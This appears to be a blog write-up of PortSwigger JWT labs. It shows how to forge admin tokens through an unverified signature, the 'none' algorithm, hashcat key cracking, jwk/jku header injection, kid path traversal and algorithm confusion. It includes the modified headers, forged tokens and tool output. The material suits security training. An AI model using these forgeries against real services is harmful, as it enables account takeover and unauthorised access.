---
title: PortSwigger - JWT attacks
date: '2024-05-10'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## JWT attacks
JWT tokens involve header, payload and signature. The signature in most cases is derived by hashing the header and payload and encrypting that. The process involves a secret server signing key.
- As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.
    
- Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.

a JWT is usually either a JWS or JWE token. When people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.

#### JWT authentication bypass via unverified signature
In some cases developers forget to verify the jwt signature, instead they only decode it. Most frameworks have separate `decode` and `verify` functions.

In this lab jwt signature is not being verified so we can change the claims to jump to admin user.

```json
Here is the original claim
{"iss":"portswigger","exp":1723906703,"sub":"wiener"}

We changed the sub part to administrator
{"iss":"portswigger","exp":1723906703,"sub":"administrator"}
```

This allowed us to jump to admin account.

#### JWT authentication bypass via flawed signature verification
In this lab the JWT token supported the `none` or `None` algorithm. To do this simply remove the signature part entirely , only leave the dot. And change the header `alg` parameter to `none`.

```json
Original header
{"kid":"f04b7c7d-1568-4015-9a27-5c05879877b0","alg":"RS256"}

Changed header
{"kid":"f04b7c7d-1568-4015-9a27-5c05879877b0","alg":"None"}

Changed body
{"iss":"portswigger","exp":1723907230,"sub":"administrator"}


eyJraWQiOiJmMDRiN2M3ZC0xNTY4LTQwMTUtOWEyNy01YzA1ODc5ODc3YjAiLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcyMzkwNzIzMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```


#### JWT authentication bypass via weak signing key
Some JWT algorithm like `HS256` use a standalone string secret key. If this key is predictable or is bruteforced , then we can create our tokens. We can use hashcat to bruteforce a existing token with a dictionary attack. This attack is offline 

```
To perform this attack simply bruteforce the key using hashcat. 

hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

Go to jwt.io and paste the original token, change the sub to administrator and paste the secret in the given section, a new valid token will be generated by jwt.io. Paste that in localstorage and refresh the page
```

#### JWT authentication bypass via jwk header injection
The only header that is compulsory for jwt is `alg` header, everything else is optional. This makes the standard very flexible but also leaves room for mistakes. 
The `jwk` header contains server public key to verify the signature. A misconfiguration can occur here where server can accept any key to verify the signature. To do this we have to sign a JWT using our own private key, and then in the `jwk` header we add our public key, as the server is misconfigured to accept legitimate token without verifying the public key is its own or not. This can lead to authentication using our own token.

```json
{ 
	"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG", 
	 "typ": "JWT", 
	 "alg": "RS256", 
	 "jwk": { 
		 "kty": "RSA", 
		 "e": "AQAB", 
		 "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG", 
		 "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m" 
	}
}
```

Note that this happens with `RS256` algorithm. The `HS256` algorithm uses a single symmetric key for signing and verifying JWTs.

We can use the `jwt editor` burp extension to generate our own RSA private and public key pairs.

To do this generate a RSA key pair using jwt extension. Intercept the request from the web page, change the name `wiener` to `administrator` as done in the above labs, and then click on `attack` and `inject jwk header` and then forward the request.

#### JWT authentication bypass via jku header injection
Instead of embedding public keys directly using the `jwk` header parameter, some servers let you use the `jku` (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.

1- Generate a new RSA key using jwt burp extension.
2- Copy this RSA key as JWK and paste it in exploit server
3- Make sure the kid in jwt matches the one in RSA key pasted in exploit server
4- Add `jku` header and paste the exploit server url in it.
4- Click on sign and send it

```json
# RSA key pasted on exploit server
{
"keys":[
{
    "e": "AQAB",
    "kid": "7d25022d-9239-4683-8ba5-0f8e53db6a65",
    "qi": "cH9O4Z3iJ76tc6u37uZ-fX_GawZCI8_PiVlmmApL-"
}
]
}


# Original JWT 
{
	"kid":"d3ff299d-cfde-4492-8430-eeaf91175176",
	"alg":"RS256"
}

{
	"iss":"portswigger",
	"exp":1723970521,
	"sub":"wiener"
}


# Modified JWT to access admin panel
{  
    "kid": "7d25022d-9239-4683-8ba5-0f8e53db6a65",  
    "alg": "RS256",  
    "jku": "https://exploit-0afb003e03b0514080015717015f00fc.exploit-server.net/exploit"  
}

{  
    "iss": "portswigger",  
    "exp": 1723970521,  
    "sub": "administrator"  
}
```


#### JWT authentication bypass via kid header path traversal
Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a `kid` (Key ID) parameter, which helps the server identify which key to use when verifying the signature. `kid` parameter can also be used to point to database or file, Due to this reason it can become vulnerable to path traversal. We can use the path traversal to force the server to use file or filesystem as a verification key.You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.

1- Generate a new HS256 key using burp jwt extension
2- We will use the base64 encoded null value in key i.e., `AA==`

```json
# generated key
{  
    "kty": "oct",  
    "kid": "2301cea7-943c-44e8-9ab2-cfedb885427c",  
    "k": "AA=="  
}
```

3- Change the jwt

```json
# Original JWT header
{
	"kid":"094c35b5-b1cb-4f35-9199-bca851cfafb9",
	"alg":"HS256"
}
{
	"iss":"portswigger",
	"exp":1723975523,
	"sub":"wiener"
}

# Modified JWT header
{  
    "kid": "../../../../../../../../../../dev/null",  
    "alg": "HS256"  
}
{  
    "iss": "portswigger",  
    "exp": 1723975523,  
    "sub": "administrator"  
}

```

4- Sign it using `HS256` key we created earlier

---
## Algorithm Confusion Attacks

When we are able to verify a JSON web token using our own algorithm other than the intended one by attacker.

`HS256` : `HMAC+SHA256` uses symmetric key i.e, same key of signing and verifying JWT
`RSA256`: `RSA+SHA-256` uses asymmetric key i.e, private key to sign the token and related public key to verify the token

These vulnerabilities arise due to flawed implementation of signature verification. For example

```javascript
function verify(token, secretorPublicKey){
	algorithm = token.getAlgHeader();
	if (algorithm == 'RS256'){
		// use the provided key as RSA public key
	} else if (algorithm == 'HS256'){
		// use the provided key as HMAC secret
	}
}
```

Note that same key if used with `HS256` will be treated as a symmetric secret key for HMAC !
This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.


To perform an algorithm confusion attack
- Obtain server public key
- Convert the public key to a suitable format
- Create a malicious JWT
- Sign the token with `HS256`

#### JWT authentication bypass via algorithm confusion
We find the server's public key using the following endpoints :

```
/jwks.json
/.well-known/jwks.json
```

We copy the public key from the endpoint.

```json
{"kty":"RSA","e":"AQAB","use":"sig","kid":"e2b029b6-f678-4d82-bce5-0cda253bcf6a","alg":"RS256","n":"pOqCMJMK9khhp_vGDeGE6z6VSaURL0HMrVCYutzGBncDtxQwoj44YWXd-ZtJ4myTN-Y8on4kyD1V6417EqFmVd8GtdI0wh5mJIAB4U8BHCCeDWoDOKQ7qyd5VFmJ3jJkK5zhMBwhcxeN6Lr_fcQfw_u0bUZ_FYW7RJ2NrpwK_hCuniswXJXgnl1I-yKT-54j_XdB63W3nPmuYA3GqIN4DYdLe6y1xyNdw88x9qjgOyXHDxJnzDPRA_rY6i0nER4aM6GFZABsAwtkbsCXfFHLeyRDrfal70NcmD8sIOqv55uUYTaNueIcHdQuPhjhxP44LTQkfFZhpBg9sQHP7QBCUw"}
```

Go to the jwt editor in burp and create new RSA and paste the above key in it. Generate the keys and copy them as PEM. Go to the decoder and convert this PEM to base64 format.

```json
# RSA key generated
{  
    "kty": "RSA",  
    "e": "AQAB",  
    "use": "sig",  
    "kid": "e2b029b6-f678-4d82-bce5-0cda253bcf6a",  
    "alg": "RS256",  
    "n": "pOqCMJMK9khhp_vGDeGE6z6VSaURL0HMrVCYutzGBncDtxQwoj44YWXd-ZtJ4myTN-Y8on4kyD1V6417EqFmVd8GtdI0wh5mJIAB4U8BHCCeDWoDOKQ7qyd5VFmJ3jJkK5zhMBwhcxeN6Lr_fcQfw_u0bUZ_FYW7RJ2NrpwK_hCuniswXJXgnl1I-yKT-54j_XdB63W3nPmuYA3GqIN4DYdLe6y1xyNdw88x9qjgOyXHDxJnzDPRA_rY6i0nER4aM6GFZABsAwtkbsCXfFHLeyRDrfal70NcmD8sIOqv55uUYTaNueIcHdQuPhjhxP44LTQkfFZhpBg9sQHP7QBCUw"  
}


# PEM format of the RSA key
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApOqCMJMK9khhp/vGDeGE
6z6VSaURL0HMrVCYutzGBncDtxQwoj44YWXd+ZtJ4myTN+Y8on4kyD1V6417EqFm
Vd8GtdI0wh5mJIAB4U8BHCCeDWoDOKQ7qyd5VFmJ3jJkK5zhMBwhcxeN6Lr/fcQf
w/u0bUZ/FYW7RJ2NrpwK/hCuniswXJXgnl1I+yKT+54j/XdB63W3nPmuYA3GqIN4
DYdLe6y1xyNdw88x9qjgOyXHDxJnzDPRA/rY6i0nER4aM6GFZABsAwtkbsCXfFHL
eyRDrfal70NcmD8sIOqv55uUYTaNueIcHdQuPhjhxP44LTQkfFZhpBg9sQHP7QBC
UwIDAQAB
-----END PUBLIC KEY-----


# Converting it to base64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwT3FDTUpNSzlraGhwL3ZHRGVHRQo2ejZWU2FVUkwwSE1yVkNZdXR6R0JuY0R0eFF3b2o0NFlXWGQrWnRKNG15VE4rWThvbjRreUQxVjY0MTdFcUZtClZkOEd0ZEkwd2g1bUpJQUI0VThCSENDZURXb0RPS1E3cXlkNVZGbUozakprSzV6aE1Cd2hjeGVONkxyL2ZjUWYKdy91MGJVWi9GWVc3UkoyTnJwd0svaEN1bmlzd1hKWGdubDFJK3lLVCs1NGovWGRCNjNXM25QbXVZQTNHcUlONApEWWRMZTZ5MXh5TmR3ODh4OXFqZ095WEhEeEpuekRQUkEvclk2aTBuRVI0YU02R0ZaQUJzQXd0a2JzQ1hmRkhMCmV5UkRyZmFsNzBOY21EOHNJT3F2NTV1VVlUYU51ZUljSGRRdVBoamh4UDQ0TFRRa2ZGWmhwQmc5c1FIUDdRQkMKVXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==

```

After the above steps we have to add this above generated base64 public key to a symmetric algorithm (to make it seem like a private key). To do that , in jwt editor create a new symmetric key, and paste the above key in the key section.

```json
# Symmetric key
{  
    "kty": "oct",  
    "kid": "965e4d93-09dc-4d1d-9e29-5563277082fb",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwT3FDTUpNSzlraGhwL3ZHRGVHRQo2ejZWU2FVUkwwSE1yVkNZdXR6R0JuY0R0eFF3b2o0NFlXWGQrWnRKNG15VE4rWThvbjRreUQxVjY0MTdFcUZtClZkOEd0ZEkwd2g1bUpJQUI0VThCSENDZURXb0RPS1E3cXlkNVZGbUozakprSzV6aE1Cd2hjeGVONkxyL2ZjUWYKdy91MGJVWi9GWVc3UkoyTnJwd0svaEN1bmlzd1hKWGdubDFJK3lLVCs1NGovWGRCNjNXM25QbXVZQTNHcUlONApEWWRMZTZ5MXh5TmR3ODh4OXFqZ095WEhEeEpuekRQUkEvclk2aTBuRVI0YU02R0ZaQUJzQXd0a2JzQ1hmRkhMCmV5UkRyZmFsNzBOY21EOHNJT3F2NTV1VVlUYU51ZUljSGRRdVBoamh4UDQ0TFRRa2ZGWmhwQmc5c1FIUDdRQkMKVXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="  
}
```

Now change the JWT to our own and sign it with our Symmetric key.

```json
# Original JWT
{  
    "kid": "e2b029b6-f678-4d82-bce5-0cda253bcf6a",  
    "alg": "HS256"  
}
{  
    "iss": "portswigger",  
    "exp": 1724055594,  
    "sub": "administrator"  
}

# Modified JWT
{  
    "kid": "e2b029b6-f678-4d82-bce5-0cda253bcf6a",  
    "alg": "HS256"  
}
{  
    "iss": "portswigger",  
    "exp": 1724055594,  
    "sub": "administrator"  
}

# Finally click on sign and sign it with out algorithm
```

##### JWT authentication bypass via algorithm confusion with no exposed key
In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as `jwt_forgery.py`. You can find this, along with several other useful scripts, on the [`rsa_sign2n` GitHub repository](https://github.com/silentsignal/rsa_sign2n).

We have also created a simplified version of this tool, which you can run as a single command:

`docker run --rm -it portswigger/sig2n <token1> <token2>`

Run the script it will give the following output. The script requires 2 jwt tokens so login 2 times and paste both jwt.

```shell
╭─asif@192 ~
╰─$ docker run --rm -it portswigger/sig2n 
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
Running command: python3 jwt_forgery.py <token1> <token2>

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUJkSklIRDZnd05zUUh1ZmsyK2xQZgpxT09DMm5tY2xlWml5Vmd4QWV5M0lLTFZ5clh4dnFsL3hZbmFSTFU0QVQ1TlFGZXdVbmtsT2ZRSTRNS1VwbUJrCkQzb1VGMnlqTzA0Z2d1SjNDdzFGcTVBdlhVMnMrSkhhdU9pdlE0cnUwZXVhMWwyVjJHZlN4Nm1KckdkS0c2cEMKVG5sUHFzYi8wT0hyc0VKTVk0MlJQdmxmSzNnMFpkeGR6NWJBSTA4YUxzZytUQmoxZkt1M2pwbVFQdTZtRm5vWgpMSEVxVENmMkhxbTAzRlRBZ3FvOG1zZ1BrdzJ0UWNoY3FBQ0EzUzJadUNBcVBVQW51cnE4bGpka21jeFFmNHJuClFRZ0hjRTZrVDZDSTJjTUJlK1hNUmc2UTF2S1NLL2txNGh5WU1wQVQ3Tm96UzdsK0RjU0d5cStJQXpCUkpVbVgKWWdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI4Yzk2Mzg3MC0wN2Q2LTQ5YzEtODU0NC0yYTFjMTQ5MDIxNTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTcyNDE0MDEwNCwgInN1YiI6ICJ3aWVuZXIifQ.uZqqcXb7TOHElo1L8GAFALefaLN8keZA8AQxwv_pY84
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQmRKSUhENmd3TnNRSHVmazIrbFBmcU9PQzJubWNsZVppeVZneEFleTNJS0xWeXJYeHZxbC8KeFluYVJMVTRBVDVOUUZld1Vua2xPZlFJNE1LVXBtQmtEM29VRjJ5ak8wNGdndUozQ3cxRnE1QXZYVTJzK0pIYQp1T2l2UTRydTBldWExbDJWMkdmU3g2bUpyR2RLRzZwQ1RubFBxc2IvME9IcnNFSk1ZNDJSUHZsZkszZzBaZHhkCno1YkFJMDhhTHNnK1RCajFmS3UzanBtUVB1Nm1Gbm9aTEhFcVRDZjJIcW0wM0ZUQWdxbzhtc2dQa3cydFFjaGMKcUFDQTNTMlp1Q0FxUFVBbnVycThsamRrbWN4UWY0cm5RUWdIY0U2a1Q2Q0kyY01CZStYTVJnNlExdktTSy9rcQo0aHlZTXBBVDdOb3pTN2wrRGNTR3lxK0lBekJSSlVtWFlnSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI4Yzk2Mzg3MC0wN2Q2LTQ5YzEtODU0NC0yYTFjMTQ5MDIxNTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTcyNDE0MDEwNCwgInN1YiI6ICJ3aWVuZXIifQ.4kVWpBd1jOBNyQlDqJ3qc5CfhBlTjZVfni-cfb1hZjY

Found n with multiplier 2:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF1a2tEaDlRWUcySUQzUHliZlNudgoxSEhCYlR6T1N2TXhaS3dZZ1BaYmtGRnE1VnI0MzFTLzRzVHRJbHFjQUo4bW9DdllLVHlTblBvRWNHRktVekF5CkI3MEtDN1pSbmFjUVFYRTdoWWFpMWNnWHJxYldmRWp0WEhSWG9jVjNhUFhOYXk3SzdEUHBZOVRFMWpPbERkVWgKSnp5bjFXTi82SEQxMkNFbU1jYkluM3l2bGJ3YU11NHU1OHRnRWFlTkYyUWZKZ3g2dmxYYngweklIM2RUQ3owTQpsamlWSmhQN0QxVGFiaXBnUVZVZVRXUUh5WWJXb09RdVZBQkFicGJNM0JBVkhxQVQzVjFlU3h1eVRPWW9QOFZ6Cm9JUUR1Q2RTSjlCRWJPR0F2ZkxtSXdkSWEzbEpGZnlWY1E1TUdVZ0o5bTBacGR5L0J1SkRaVmZFQVpnb2txVEwKc1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI4Yzk2Mzg3MC0wN2Q2LTQ5YzEtODU0NC0yYTFjMTQ5MDIxNTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTcyNDE0MDEwNCwgInN1YiI6ICJ3aWVuZXIifQ.fqezTrNzuruzEMAvRcJ8vZ3uFxzBD9pQv4Eq75h7mt0
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXVra0RoOVFZRzJJRDNQeWJmU252MUhIQmJUek9Tdk14Wkt3WWdQWmJrRkZxNVZyNDMxUy8KNHNUdElscWNBSjhtb0N2WUtUeVNuUG9FY0dGS1V6QXlCNzBLQzdaUm5hY1FRWEU3aFlhaTFjZ1hycWJXZkVqdApYSFJYb2NWM2FQWE5heTdLN0RQcFk5VEUxak9sRGRVaEp6eW4xV04vNkhEMTJDRW1NY2JJbjN5dmxid2FNdTR1CjU4dGdFYWVORjJRZkpneDZ2bFhieDB6SUgzZFRDejBNbGppVkpoUDdEMVRhYmlwZ1FWVWVUV1FIeVliV29PUXUKVkFCQWJwYk0zQkFWSHFBVDNWMWVTeHV5VE9Zb1A4VnpvSVFEdUNkU0o5QkViT0dBdmZMbUl3ZElhM2xKRmZ5VgpjUTVNR1VnSjltMFpwZHkvQnVKRFpWZkVBWmdva3FUTHNRSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI4Yzk2Mzg3MC0wN2Q2LTQ5YzEtODU0NC0yYTFjMTQ5MDIxNTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTcyNDE0MDEwNCwgInN1YiI6ICJ3aWVuZXIifQ.Q7I2CEjj2PNVzPVZsimPsSyGtDqnqcwklCBAZMLPI_o
```


Copy each tempered JWT and see which one works. After getting a working tampered JWT use it to create a new symmetric key from jwt editor burp extension.

```json
# symmetric key created
{  
    "kty": "oct",  
    "kid": "61572a57-311c-4a1b-804d-ac14c679ffb9",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF1a2tEaDlRWUcySUQzUHliZlNudgoxSEhCYlR6T1N2TXhaS3dZZ1BaYmtGRnE1VnI0MzFTLzRzVHRJbHFjQUo4bW9DdllLVHlTblBvRWNHRktVekF5CkI3MEtDN1pSbmFjUVFYRTdoWWFpMWNnWHJxYldmRWp0WEhSWG9jVjNhUFhOYXk3SzdEUHBZOVRFMWpPbERkVWgKSnp5bjFXTi82SEQxMkNFbU1jYkluM3l2bGJ3YU11NHU1OHRnRWFlTkYyUWZKZ3g2dmxYYngweklIM2RUQ3owTQpsamlWSmhQN0QxVGFiaXBnUVZVZVRXUUh5WWJXb09RdVZBQkFicGJNM0JBVkhxQVQzVjFlU3h1eVRPWW9QOFZ6Cm9JUUR1Q2RTSjlCRWJPR0F2ZkxtSXdkSWEzbEpGZnlWY1E1TUdVZ0o5bTBacGR5L0J1SkRaVmZFQVpnb2txVEwKc1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="  
}
```

Now modify the jwts and sign it with above created key.

```json
# Original JWTs
{  
    "kid": "8c963870-07d6-49c1-8544-2a1c14902153",  
    "alg": "RS256"  
}
{  
    "iss": "portswigger",  
    "exp": 1724056980,  
    "sub": "wiener"  
}

# Modified JWTs
{  
    "kid": "8c963870-07d6-49c1-8544-2a1c14902153",  
    "alg": "HS256"  
}
{"iss": "portswigger", "exp": 1724140104, "sub": "administrator"}

```


